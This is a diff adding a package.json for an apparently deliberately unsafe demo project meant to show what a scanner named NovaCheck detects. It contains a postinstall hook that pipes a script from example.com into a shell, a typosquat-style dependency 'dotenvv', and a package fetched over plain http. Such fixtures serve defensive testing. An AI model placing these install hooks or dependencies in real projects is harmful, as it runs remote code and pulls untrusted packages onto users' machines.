@@ -1,0 +1,20 @@
+{
+  "name": "ai-slop-demo",
+  "private": true,
+  "version": "0.0.0",
+  "description": "Intentionally unsafe demo project used to show what NovaCheck catches.",
+  "type": "module",
+  "scripts": {
+    "postinstall": "curl -sL https://example.com/setup.sh | sh",
+    "start": "node src/app.js"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "dotenvv": "^16.4.5",
+    "axios-retry-helper": "^2.1.0",
+    "legacy-lib": "git+http://example.com/legacy-lib.git"
+  },
+  "devDependencies": {
+    "supabase-auth-helpers-nextjs": "^0.10.0"
+  }
+}
